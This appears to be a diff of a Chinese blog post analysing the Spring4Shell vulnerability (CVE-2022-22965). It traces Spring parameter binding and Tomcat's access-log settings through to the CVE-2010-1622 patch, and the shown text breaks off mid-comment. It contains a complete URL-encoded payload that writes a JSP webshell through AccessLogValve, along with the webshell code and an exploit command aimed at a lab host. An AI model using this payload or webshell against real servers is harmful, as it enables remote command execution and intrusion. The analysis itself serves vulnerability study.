@@ -5,18 +5,18 @@
     
     <title>Spring4Shell简析（CVE-2022-22965） | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Spring4Shell简析（CVE-2022-22965）   Spring4Shell简析（CVE-2022-22965）  简介 漏洞存在条件 参数绑定  初识 嵌套型  环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料">
+    <meta name="description" content="Spring4Shell简析（CVE-2022-22965）  Spring4Shell简析（CVE-2022-22965） 简介 漏洞存在条件 参数绑定 初识 嵌套型   环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料">
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Spring4Shell简析（CVE-2022-22965）">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20220414-spring4shell.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="Spring4Shell简析（CVE-2022-22965）   Spring4Shell简析（CVE-2022-22965）  简介 漏洞存在条件 参数绑定  初识 嵌套型  环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料">
+<meta property="og:description" content="Spring4Shell简析（CVE-2022-22965）  Spring4Shell简析（CVE-2022-22965） 简介 漏洞存在条件 参数绑定 初识 嵌套型   环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料">
 <meta property="og:image" content="http://159.75.52.53/img/thumbnails/eggs.jpg">
-<meta property="og:updated_time" content="2022-04-22T03:00:32.426Z">
+<meta property="og:updated_time" content="2023-09-12T13:09:22.301Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Spring4Shell简析（CVE-2022-22965）">
-<meta name="twitter:description" content="Spring4Shell简析（CVE-2022-22965）   Spring4Shell简析（CVE-2022-22965）  简介 漏洞存在条件 参数绑定  初识 嵌套型  环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料">
+<meta name="twitter:description" content="Spring4Shell简析（CVE-2022-22965）  Spring4Shell简析（CVE-2022-22965） 简介 漏洞存在条件 参数绑定 初识 嵌套型   环境搭建及复现 漏洞分析 Tomcat日志与AccessLogValve 为什么部署方式必须为Tomcat war包部署 为什么要JDK 9+ 可利用程度 总结 参考资料">
 <meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/eggs.jpg">
     
 
@@ -246,18 +246,16 @@
         <div class="article-entry" itemprop="articleBody">
         
             
-			<h1 id="spring4shell简析cve-2022-22965">Spring4Shell简析（CVE-2022-22965）</h1>
-<!-- TOC -->
+			<h1 id="Spring4Shell简析（CVE-2022-22965）"><a href="#Spring4Shell简析（CVE-2022-22965）" class="headerlink" title="Spring4Shell简析（CVE-2022-22965）"></a>Spring4Shell简析（CVE-2022-22965）</h1><!-- TOC -->
 <ul>
-<li><a href="#spring4shell简析cve-2022-22965">Spring4Shell简析（CVE-2022-22965）</a>
-<ul>
+<li><a href="#spring4shell简析cve-2022-22965">Spring4Shell简析（CVE-2022-22965）</a><ul>
 <li><a href="#简介">简介</a></li>
 <li><a href="#漏洞存在条件">漏洞存在条件</a></li>
-<li><a href="#参数绑定">参数绑定</a>
-<ul>
+<li><a href="#参数绑定">参数绑定</a><ul>
 <li><a href="#初识">初识</a></li>
 <li><a href="#嵌套型">嵌套型</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#环境搭建及复现">环境搭建及复现</a></li>
 <li><a href="#漏洞分析">漏洞分析</a></li>
 <li><a href="#tomcat日志与accesslogvalve">Tomcat日志与AccessLogValve</a></li>
@@ -266,45 +264,37 @@
 <li><a href="#可利用程度">可利用程度</a></li>
 <li><a href="#总结">总结</a></li>
 <li><a href="#参考资料">参考资料</a></li>
-</ul></li>
+</ul>
+</li>
 </ul>
 <!-- /TOC -->
 <a id="more"></a>
-<h2 id="简介">简介</h2>
-<p>继去年年底爆出的Log4shell漏洞在安全圈造成巨大影响的阴影下，今年3月底的Spring4shell（也有叫Spring Beans RCE的）消息刚刚放出，就在坊间流传开来。但由于前一次的某事件，这回漏洞详情来得很平静，也没有听说过有大面积的利用事件产生。这无疑给该漏洞带来很多神秘色彩。<br>
-目前网上已有不少的分析文章，此篇仅作为自己学习和理解的记录。看了一圈，发现<a href="https://paper.seebug.org/1877/" target="_blank" rel="external">Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考</a>写的比较好，本文主要是基于这篇文章的复现和个人理解。<br>
-这个漏洞基于CVE-2010-1622，是该漏洞的补丁绕过，该漏洞即Spring的参数绑定会导致ClassLoader的后续属性的赋值，最终能够导致RCE。而CVE-2022-22965的利用方式参考了<a href="https://cloud.tencent.com/developer/article/1035297" target="_blank" rel="external">Struts2 S2-020在Tomcat 8下的命令执行分析</a>的方法</p>
-<h2 id="漏洞存在条件">漏洞存在条件</h2>
-<ol type="1">
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>继去年年底爆出的Log4shell漏洞在安全圈造成巨大影响的阴影下，今年3月底的Spring4shell（也有叫Spring Beans RCE的）消息刚刚放出，就在坊间流传开来。但由于前一次的某事件，这回漏洞详情来得很平静，也没有听说过有大面积的利用事件产生。这无疑给该漏洞带来很多神秘色彩。<br>目前网上已有不少的分析文章，此篇仅作为自己学习和理解的记录。看了一圈，发现<a href="https://paper.seebug.org/1877/" target="_blank" rel="external">Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考</a>写的比较好，本文主要是基于这篇文章的复现和个人理解。<br>这个漏洞基于CVE-2010-1622，是该漏洞的补丁绕过，该漏洞即Spring的参数绑定会导致ClassLoader的后续属性的赋值，最终能够导致RCE。而CVE-2022-22965的利用方式参考了<a href="https://cloud.tencent.com/developer/article/1035297" target="_blank" rel="external">Struts2 S2-020在Tomcat 8下的命令执行分析</a>的方法</p>
+<h2 id="漏洞存在条件"><a href="#漏洞存在条件" class="headerlink" title="漏洞存在条件"></a>漏洞存在条件</h2><ol>
 <li>JDK 9+</li>
 <li>直接或者间接地使⽤了Spring-beans包（Spring boot等框架都使用了）</li>
 <li>Controller通过参数绑定传参，参数类型为非常规类型的对象（比如非String等类型的自定义对象）</li>
-<li>Web应用部署方式必须为Tomcat war包部署</li>
+<li>Web应用部署方式必须为Tomcat war包部署 </li>
 </ol>
-<h2 id="参数绑定">参数绑定</h2>
-<h3 id="初识">初识</h3>
-<p>参数绑定使程序员编写请求处理时，能够很方便地指定获取的参数以及其类型，并且能够<strong>通过请求的参数改变对象的属性</strong>：</p>
+<h2 id="参数绑定"><a href="#参数绑定" class="headerlink" title="参数绑定"></a>参数绑定</h2><h3 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h3><p>参数绑定使程序员编写请求处理时，能够很方便地指定获取的参数以及其类型，并且能够<strong>通过请求的参数改变对象的属性</strong>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@RestController</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</div><div class="line">    <span class="function">String <span class="title">test</span><span class="params">(TestBean testBean)</span></span>&#123;</div><div class="line">        testBean.setName(<span class="string">"My test"</span>);</div><div class="line">        <span class="keyword">return</span> testBean.getName();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>如果这里我们访问url：<code>127.0.0.1:8080/test?name=123</code>，那么<code>testBean</code>对象的<code>name</code>属性将会被赋值为123。</p>
-<h3 id="嵌套型">嵌套型</h3>
-<p>Controller：</p>
+<h3 id="嵌套型"><a href="#嵌套型" class="headerlink" title="嵌套型"></a>嵌套型</h3><p>Controller：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Controller</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</div><div class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/addUser"</span>)</div><div class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">String <span class="title">addUser</span><span class="params">(User user)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"OK"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>User.java：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> String name;</div><div class="line">    <span class="keyword">private</span> Department department;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Department <span class="title">getDepartment</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> department;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDepartment</span><span class="params">(Department department)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.department = department;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>Department.java：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Department</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> String name;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>当访问<code>/addUser?name=test&amp;department.name=SEC</code>时，user对象的name被赋值为<code>test</code>，并且其成员变量department的name属性被赋值为<code>SEC</code></p>
-<h2 id="环境搭建及复现">环境搭建及复现</h2>
-<p>选择<a href="https://github.com/reznok/Spring4Shell-POC" target="_blank" rel="external">Spring4Shell PoC Application</a>，加入远程debug相应环境变量。与java 8不同的是，java 9之后的远程调试默认不支持外部IP，需要更改为:</p>
+<h2 id="环境搭建及复现"><a href="#环境搭建及复现" class="headerlink" title="环境搭建及复现"></a>环境搭建及复现</h2><p>选择<a href="https://github.com/reznok/Spring4Shell-POC" target="_blank" rel="external">Spring4Shell PoC Application</a>，加入远程debug相应环境变量。与java 8不同的是，java 9之后的远程调试默认不支持外部IP，需要更改为:</p>
 <figure class="highlight docker"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ENV</span> JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,address=*:<span class="number">10087</span>,server=y,suspend=n</div></pre></td></tr></table></figure>
 <p>访问：</p>
-<p>http://10.136.127.22:10086/helloworld/greeting</p>
+<p><a href="http://10.136.127.22:10086/helloworld/greeting" target="_blank" rel="external">http://10.136.127.22:10086/helloworld/greeting</a></p>
 <p>使用自带的exp进行攻击：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python .\exploit.py --url http://10.136.127.22:10086/helloworld/greeting</div></pre></td></tr></table></figure>
 <p>可以去<code>/usr/local/tomcat/webapps/ROOT</code>看到生成的webshell：</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"cmd"</span>)).getInputStream(); <span class="keyword">int</span> a = -<span class="number">1</span>; <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>]; <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125; %&gt;<span class="comment">//</span></div></pre></td></tr></table></figure>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>首先看Controller，<strong>参数绑定了<code>Greeting</code>类的对象</strong>greeting：</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先看Controller，<strong>参数绑定了<code>Greeting</code>类的对象</strong>greeting：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Controller</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="meta">@PostMapping</span>(<span class="string">"/greeting"</span>)</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">greetingSubmit</span><span class="params">(@ModelAttribute Greeting greeting, Model model)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>攻击payload为：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</div></pre></td></tr></table></figure>
@@ -323,8 +313,7 @@
 <p>该漏洞中，攻击者可以对绑定对象的class属性进行随意赋值，有点像原型链污染。在exp中，是利用class属性来修改Tomcat的⽇志配置，向⽇志中写⼊shell。</p>
 <p>一些细节：</p>
 <p>这些payload可以分开发送，也可以合并在一次请求中，这些属性的修改是直接影响内存的（像原型链污染），不会像php一样，下一次请求又复原。</p>
-<p>为了简化分析流程，我们仅post传入<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</code>，其他的参数都是类似的。<br>
-我们来跟一下参数绑定的解析过程，首先是<code>org\springframework\spring-web\5.3.15\spring-web-5.3.15-sources.jar!\org\springframework\web\bind\WebDataBinder.java#198</code>，在<code>WebDataBinder#doBind</code>方法中:</p>
+<p>为了简化分析流程，我们仅post传入<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</code>，其他的参数都是类似的。<br>我们来跟一下参数绑定的解析过程，首先是<code>org\springframework\spring-web\5.3.15\spring-web-5.3.15-sources.jar!\org\springframework\web\bind\WebDataBinder.java#198</code>，在<code>WebDataBinder#doBind</code>方法中:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebDataBinder</span> <span class="keyword">extends</span> <span class="title">DataBinder</span> </span>&#123;</div><div class="line">...</div><div class="line">    <span class="meta">@Override</span></div><div class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doBind</span><span class="params">(MutablePropertyValues mpvs)</span> </span>&#123;</div><div class="line">		checkFieldDefaults(mpvs);</div><div class="line">		checkFieldMarkers(mpvs);</div><div class="line">		adaptEmptyArrayIndices(mpvs);</div><div class="line">		<span class="keyword">super</span>.doBind(mpvs);<span class="comment">//跟进此处</span></div><div class="line">	&#125;</div></pre></td></tr></table></figure>
 <p>跟进去，此处省略n层，到<code>org/springframework/beans/AbstractNestablePropertyAccessor.java#814</code>，<code>getPropertyAccessorForPropertyPath</code>方法被传入当前的待解析参数属性，并且尝试解析嵌套的情况，出现嵌套时，从左边开始<strong>挨个递归解析</strong>，比如此处的属性为<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code>，将会解析最左边的<code>class</code>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">   <span class="function"><span class="keyword">protected</span> AbstractNestablePropertyAccessor <span class="title">getPropertyAccessorForPropertyPath</span><span class="params">(String propertyPath)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);</div><div class="line">	<span class="comment">// Handle nested properties recursively.</span></div><div class="line">	<span class="keyword">if</span> (pos &gt; -<span class="number">1</span>) &#123;</div><div class="line">		String nestedProperty = propertyPath.substring(<span class="number">0</span>, pos);</div><div class="line">		String nestedPath = propertyPath.substring(pos + <span class="number">1</span>);</div><div class="line">		AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);<span class="comment">//进入这里</span></div><div class="line">		<span class="keyword">return</span> nestedPa.getPropertyAccessorForPropertyPath(nestedPath);<span class="comment">//递归调用，每次解析一级</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">this</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -332,7 +321,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">   <span class="function"><span class="keyword">private</span> AbstractNestablePropertyAccessor <span class="title">getNestedPropertyAccessor</span><span class="params">(String nestedProperty)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.nestedPropertyAccessors == <span class="keyword">null</span>) &#123;</div><div class="line">		<span class="keyword">this</span>.nestedPropertyAccessors = <span class="keyword">new</span> HashMap&lt;&gt;();</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// Get value of bean property.</span></div><div class="line">	PropertyTokenHolder tokens = getPropertyNameTokens(nestedProperty);</div><div class="line">	String canonicalName = tokens.canonicalName;</div><div class="line">	Object value = getPropertyValue(tokens); <span class="comment">//跟进这里</span></div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>继续跟进：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">   <span class="meta">@Nullable</span></div><div class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getPropertyValue</span><span class="params">(PropertyTokenHolder tokens)</span> <span class="keyword">throws</span> BeansException </span>&#123;</div><div class="line">	String propertyName = tokens.canonicalName;</div><div class="line">	String actualName = tokens.actualName;</div><div class="line">	PropertyHandler ph = getLocalPropertyHandler(actualName);<span class="comment">//这里的ph包含了待获取的"class"信息</span></div><div class="line">	<span class="keyword">if</span> (ph == <span class="keyword">null</span> || !ph.isReadable()) &#123;</div><div class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> NotReadablePropertyException(getRootClass(), <span class="keyword">this</span>.nestedPath + propertyName);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">		Object value = ph.getValue(); <span class="comment">//跟进这里</span></div><div class="line">	    ...</div><div class="line">	&#125;</div><div class="line">	...</div></pre></td></tr></table></figure>
-<p>此处的ph变量是BeanWrapperImpl对象，该对象装饰了java bean（在这里是Greeting对象），并提供对其属性（这里传入了“class”字符串，获取的是<code>class</code>属性）的获取和更改（get和set），之后调用的<code>ph.getValue();</code>会获取Greeting对象的class属性：跟进去之后，在<code>org/springframework/beans/BeanWrapperImpl.java#getValue</code>中会获取到<code>java.lang.Class java.lang.Object.getClass()</code>，从而使<code>class</code>被解析为<code>java.lang.Object.Class</code>类的对象（具体值为<code>class com.reznok.helloworld.Greeting</code>）：</p>
+<p>此处的ph变量是BeanWrapperImpl对象，该对象装饰了java bean（在这里是Greeting对象），并提供对其属性（这里传入了”class”字符串，获取的是<code>class</code>属性）的获取和更改（get和set），之后调用的<code>ph.getValue();</code>会获取Greeting对象的class属性：跟进去之后，在<code>org/springframework/beans/BeanWrapperImpl.java#getValue</code>中会获取到<code>java.lang.Class java.lang.Object.getClass()</code>，从而使<code>class</code>被解析为<code>java.lang.Object.Class</code>类的对象（具体值为<code>class com.reznok.helloworld.Greeting</code>）：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">      <span class="meta">@Override</span></div><div class="line"><span class="meta">@Nullable</span></div><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">  		Method readMethod = <span class="keyword">this</span>.pd.getReadMethod(); <span class="comment">// 这一步获取到 java.lang.Class java.lang.Object.getClass()</span></div><div class="line">	<span class="keyword">if</span> (System.getSecurityManager() != <span class="keyword">null</span>) &#123;</div><div class="line">		...</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		ReflectionUtils.makeAccessible(readMethod);</div><div class="line">		<span class="keyword">return</span> readMethod.invoke(getWrappedInstance(), (Object[]) <span class="keyword">null</span>); <span class="comment">// </span></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>这里会返回Greeting的class属性。到这里，单次解析过程分析完毕。我们来对照一下过程：我们现在在解析<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code>中的<code>class</code>，而当前绑定参数对象为Greeting类的对象，所以实际上是调用了<code>Greeting.getClass()</code></p>
 <p>然后我们来跟下一层解析，即<code>module.classLoader.resources.context.parent.pipeline.first.suffix</code>中的<code>module</code>的解析。我们再来看解析的入口，即递归处，此时的nestedPa为上一步解析出的<code>java.lang.Object.Class</code>对象，根据前一步的分析，这里会尝试获取该对象的module属性，即会调用<code>java.lang.Object.Class.getModule()</code></p>
@@ -345,8 +334,7 @@
 <li>该过程中，<code>java.lang.Module.getClassLoader()</code>得到<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>这步的跨度较大，这步很关键，在后文war包部署部分会详细介绍。</li>
 <li>其他的几个属性解析赋值的过程类似。</li>
 </ul>
-<h2 id="tomcat日志与accesslogvalve">Tomcat日志与AccessLogValve</h2>
-<p>下面我们来详细看一下Tomcat日志相关的部分，首先是exp中设置的几个属性，它们的作用为：</p>
+<h2 id="Tomcat日志与AccessLogValve"><a href="#Tomcat日志与AccessLogValve" class="headerlink" title="Tomcat日志与AccessLogValve"></a>Tomcat日志与AccessLogValve</h2><p>下面我们来详细看一下Tomcat日志相关的部分，首先是exp中设置的几个属性，它们的作用为：</p>
 <ul>
 <li>pattern：日志的文件内容格式；其中，pattern有一些特殊的语法，比如<code>%{xxx}i</code>表示获取<strong>请求</strong>的header中的xxx头的值，并将其打印到日志中</li>
 <li>suffix：日志文件名后缀</li>
@@ -356,13 +344,11 @@
 </ul>
 <p>参考：<a href="https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html#Access_Log_Valve" target="_blank" rel="external">Access Log Valve</a></p>
 <p>为什么攻击时用于产生日志的get请求中，请求的header会有<code>&quot;c&quot;: &quot;Runtime&quot;</code>？在pattern中是包含了<code>%{c}i</code>这一格式化记录数据的，所以c的值会被替换为Runtime。只要得到的日志文件没有语法错误，不使用这种方法也能利用成功，但是需要注意的是，http头中的信息在记录到日志文件中时，<strong>会对双引号进行转义</strong>，而在pattern中直接赋值时不会转义，所以直接在header中传入webshell会导致shell无法成功执行。</p>
-<h2 id="为什么部署方式必须为tomcat-war包部署">为什么部署方式必须为Tomcat war包部署</h2>
-<ul>
-<li>LaunchedURLClassLoader是以jar的形式启动Spring boot的加载器来加载/lib下面的jar，LaunchedURLClassLoader和普通的URLClassLoader的不同之处是，它提供了从Archive里加载.class的能力。参考：<a href="https://hengyunabc.github.io/spring-boot-application-start-analysis/" target="_blank" rel="external">spring boot应用启动原理分析</a></li>
+<h2 id="为什么部署方式必须为Tomcat-war包部署"><a href="#为什么部署方式必须为Tomcat-war包部署" class="headerlink" title="为什么部署方式必须为Tomcat war包部署"></a>为什么部署方式必须为Tomcat war包部署</h2><ul>
+<li>LaunchedURLClassLoader是以jar的形式启动Spring boot的加载器来加载/lib下面的jar，LaunchedURLClassLoader和普通的URLClassLoader的不同之处是，它提供了从Archive里加载.class的能力。参考：<a href="https://hengyunabc.github.io/spring-boot-application-start-analysis/" target="_blank" rel="external">spring boot应用启动原理分析 </a></li>
 <li>在利用时，存在<code>java.lang.Module.getClassLoader()</code>得到<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>这一步，<code>ParallelWebappClassLoader</code>只能是war包部署时的返回值；如果使用jar包的形式进行部署，则此步获取到的对象是<code>org.springframework.boot.loader.LaunchedURLClassLoader</code>，该类下没有resources成员变量，导致利用链断掉。</li>
 </ul>
-<h2 id="为什么要jdk-9">为什么要JDK 9+</h2>
-<p>前面提到，该漏洞是对CVE-2010-1622的绕过，这个绕过是出现在9+之后对<strong>模块化</strong>的支持上的，在<code>org/springframework/beans/CachedIntrospectionResults.java#CachedIntrospectionResults#289</code>中有对CVE-2010-1622的修复补丁：</p>
+<h2 id="为什么要JDK-9"><a href="#为什么要JDK-9" class="headerlink" title="为什么要JDK 9+"></a>为什么要JDK 9+</h2><p>前面提到，该漏洞是对CVE-2010-1622的绕过，这个绕过是出现在9+之后对<strong>模块化</strong>的支持上的，在<code>org/springframework/beans/CachedIntrospectionResults.java#CachedIntrospectionResults#289</code>中有对CVE-2010-1622的修复补丁：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachedIntrospectionResults</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="title">CachedIntrospectionResults</span><span class="params">(Class&lt;?&gt; beanClass)</span> <span class="keyword">throws</span> BeansException </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">for</span> (PropertyDescriptor pd : pds) &#123;</div><div class="line">				<span class="keyword">if</span> (Class.class == beanClass &amp;&amp;</div><div class="line">						(<span class="string">"classLoader"</span>.equals(pd.getName()) ||  <span class="string">"protectionDomain"</span>.equals(pd.getName()))) &#123;</div><div class="line">					<span class="comment">// Ignore Class.getClassLoader() and getProtectionDomain() methods - nobody needs to bind 